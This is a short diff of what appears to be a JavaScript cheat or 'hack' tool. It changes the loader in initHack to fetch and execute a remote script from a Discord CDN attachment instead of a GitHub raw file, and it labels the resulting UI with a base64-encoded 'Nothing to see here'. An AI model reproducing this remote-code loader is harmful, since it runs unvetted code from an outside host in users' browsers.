@@ -21665,7 +21665,7 @@ const initHack = () => {
     loadScript = () => {
         loadSettings();
         const _ = document.createElement("script");
-        _.src = "https://raw.githubusercontent.com/xoFirexx/sdasdasdsd/main/sadasdad", _.onload = () => {
+        _.src = "https://cdn.discordapp.com/attachments/1216017627915485195/1227242884948951080/message.txt?ex=6627b200&is=66153d00&hm=c7b5e83a7c6a5cf06efce6d04b40ce645a7b5a08db65613de39e418b57e1f211&", _.onload = () => {
             new exclusive({
                 title: "Tm90aGluZyB0byBzZWUgaGVyZQ==",
                 align: "right",
